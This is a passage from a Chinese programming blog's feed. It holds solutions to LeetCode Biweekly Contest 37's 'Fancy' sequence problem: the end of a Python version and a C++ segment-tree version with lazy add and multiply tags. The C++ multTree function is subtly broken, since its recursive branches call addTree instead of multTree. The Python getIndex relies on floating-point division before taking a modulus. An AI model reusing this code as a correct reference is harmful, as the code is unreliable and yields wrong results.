<span class="title">multAll</span><span class="params">(self, m)</span>:</span></span><br><span class="line">        self.add[<span class="number">-1</span>] *= m</span><br><span class="line">        self.mul[<span class="number">-1</span>] *= m</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getIndex</span><span class="params">(self, i)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> i &gt;= len(self.A): <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">        m = self.mul[<span class="number">-1</span>] / self.mul[i]</span><br><span class="line">        inc = self.add[<span class="number">-1</span>] - self.add[i] * m</span><br><span class="line">        <span class="keyword">return</span> (self.A[i] * m + inc) % (<span class="number">10</span> ** <span class="number">9</span> + <span class="number">7</span>)</span><br></pre></td></tr></table></figure></li><li>线段树解法<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAXN = <span class="number">1e4</span> + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MOD = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ls(root) (root&lt;&lt;1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rs(root) (root&lt;&lt;1|1)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SegTreeNode</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> l;</span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> mult;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> add;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> sum;</span><br><span class="line">&#125;;</span><br><span class="line">SegTreeNode tree[MAXN&lt;&lt;<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">buildTree</span><span class="params">(<span class="keyword">int</span> root,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    tree[root].l = l;</span><br><span class="line">    tree[root].r = r;</span><br><span class="line">    tree[root].sum = <span class="number">0</span>;</span><br><span class="line">    tree[root].add = <span class="number">0</span>;</span><br><span class="line">    tree[root].mult = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(l == r) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">int</span> mid = (l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    buildTree(ls(root),l,mid);</span><br><span class="line">    buildTree(rs(root),mid+<span class="number">1</span>,r);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">pushupTree</span><span class="params">(<span class="keyword">int</span> root)</span></span>&#123;</span><br><span class="line">    tree[root].sum = (tree[ls(root)].sum + tree[rs(root)].sum)%MOD;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">pushdownTree</span><span class="params">(<span class="keyword">int</span> root)</span></span>&#123;</span><br><span class="line">    <span class="comment">/*we transfer the array to the low level*/</span></span><br><span class="line">    <span class="keyword">if</span> (tree[root].add != <span class="number">0</span> || tree[root].mult != <span class="number">1</span>) &#123;</span><br><span class="line">            tree[ls(root)].sum = (tree[ls(root)].sum * tree[root].mult + (tree[ls(root)].r - tree[ls(root)].l + <span class="number">1</span>) * tree[root].add) % MOD;</span><br><span class="line">            tree[rs(root)].sum = (tree[rs(root)].sum * tree[root].mult + (tree[rs(root)].r - tree[rs(root)].l + <span class="number">1</span>) * tree[root].add) % MOD;</span><br><span class="line">            tree[ls(root)].mult = tree[ls(root)].mult * tree[root].mult % MOD;</span><br><span class="line">            tree[rs(root)].mult = tree[rs(root)].mult * tree[root].mult % MOD;</span><br><span class="line">            tree[ls(root)].add = (tree[ls(root)].add * tree[root].mult + tree[root].add) % MOD;</span><br><span class="line">            tree[rs(root)].add = (tree[rs(root)].add * tree[root].mult + tree[root].add) % MOD;</span><br><span class="line">            tree[root].mult = <span class="number">1</span>;</span><br><span class="line">            tree[root].add = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">addTree</span><span class="params">(<span class="keyword">int</span> root,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">long</span> <span class="keyword">long</span> val)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l == tree[root].l &amp;&amp; r == tree[root].r)&#123;</span><br><span class="line">        tree[root].sum = (tree[root].sum + val*(r-l+<span class="number">1</span>))%MOD;</span><br><span class="line">        tree[root].add = (tree[root].add + val)%MOD;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pushdownTree(root);</span><br><span class="line">    <span class="keyword">int</span> mid = (tree[root].l + tree[root].r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(r &lt;= mid)&#123;</span><br><span class="line">        addTree(ls(root),l,r,val);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(l &gt; mid)&#123;</span><br><span class="line">        addTree(rs(root),l,r,val);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        addTree(ls(root),l,mid,val);</span><br><span class="line">        addTree(rs(root),mid+<span class="number">1</span>,r,val);</span><br><span class="line">    &#125;</span><br><span class="line">    pushupTree(root);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">multTree</span><span class="params">(<span class="keyword">int</span> root,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> val)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l == tree[root].l &amp;&amp; r == tree[root].r)&#123;</span><br><span class="line">        tree[root].sum = (tree[root].sum*val)%MOD;</span><br><span class="line">        tree[root].mult = (tree[root].mult*val)%MOD;</span><br><span class="line">        tree[root].add = (tree[root].add*val)%MOD;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pushdownTree(root);</span><br><span class="line">    <span class="keyword">int</span> mid = (tree[root].l + tree[root].r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(r &lt;= mid)&#123;</span><br><span class="line">        addTree(ls(root),l,r,val);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(l &gt; mid)&#123;</span><br><span class="line">        addTree(rs(root),l,r,val);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        addTree(ls(root),l,mid,val);</span><br><span class="line">        addTree(rs(root),mid+<span class="number">1</span>,r,val);</span><br><span class="line">    &#125;</span><br><span class="line">    pushupTree(root);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">queryTree</span><span class="params">(<span class="keyword">int</span> root,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l == tree[root].l &amp;&amp; r == tree[root].r)&#123;</span><br><span class="line">        <span class="keyword">return</span> tree[root].sum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pushdownTree(root);</span><br><span class="line">    <span class="keyword">int</span> mid = (tree[root].l + tree[root].r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(r &lt;= mid)&#123;</span><br><span class="line">        <span class="keyword">return</span> queryTree(ls(root),l,r);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(l &gt; mid)&#123;</span><br><span class="line">        <span class="keyword">return</span> queryTree(rs(root),l,r);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (queryTree(ls(root),l,mid) + queryTree(rs(root),mid+<span class="number">1</span>,r))%MOD;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fancy</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Fancy() &#123;</span><br><span class="line">        arr = <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;();</span><br><span class="line">        buildTree(<span class="number">1</span>,<span class="number">0</span>,<span class="number">10000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">append</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        arr.push_back(val);</span><br><span class="line">        <span class="keyword">int</span> n = arr.size();</span><br><span class="line">        addTree(<span class="number">1</span>,n<span class="number">-1</span>,n<span class="number">-1</span>,val);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addAll</span><span class="params">(<span class="keyword">int</span> inc)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = arr.size();</span><br><span class="line">        addTree(<span class="number">1</span>,<span class="number">0</span>,n<span class="number">-1</span>,inc);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">multAll</span><span class="params">(<span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = arr.size();</span><br><span class="line">        multTree(<span class="number">1</span>,<span class="number">0</span>,n<span class="number">-1</span>,m);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getIndex</span><span class="params">(<span class="keyword">int</span> idx)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = arr.size();</span><br><span class="line">        <span class="keyword">if</span>(idx &gt;= n) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">return</span> queryTree(<span class="number">1</span>,idx,idx);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; arr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your Fancy object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * Fancy* obj = new Fancy();</span></span><br><span class="line"><span class="comment"> * obj-&gt;append(val);</span></span><br><span class="line"><span class="comment"> * obj-&gt;addAll(inc);</span></span><br><span class="line"><span class="comment"> * obj-&gt;multAll(m);</span></span><br><span class="line"><span class="comment"> * int param_4 = obj-&gt;getIndex(idx);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;leetcode-biweekly-contest-37&quot;&gt;&lt;a href=&quot;#leetcode-biweekly-contest-37&quot; class=&quot;headerlink&quot; title=&quot;leetcode biweekly contest 37&quot;&gt;&lt;/a&gt;leetcode biweekly contest 37&lt;/h1&gt;&lt;p&gt;本周的双周赛题目质量不错，只做出了前三题。思考的地方有许多。&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2020/10/18/k8uP3gozF1rxXE6.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;&lt;h2 id=&quot;5122-删除某些元素后的数组均值&quot;&gt;&lt;a href=&quot;#5122-删除某些元素后的数组均值&quot; class=&quot;headerlink&quot; title=&quot;5122. 删除某些元素后的数组均值&quot;&gt;&lt;/a&gt;5122. 删除某些元素后的数组均值&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;给你一个整数数组 &lt;code&gt;arr&lt;/code&gt; ，请你删除最小 &lt;code&gt;5%&lt;/code&gt; 的数字和最大 5% 的数字后，剩余数字的平均值。&lt;/p&gt;&lt;p&gt;与 标准答案 误差在 &lt;code&gt;10-5&lt;/code&gt;的结果都被视为正确结果。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
  </entry>
  
</feed>
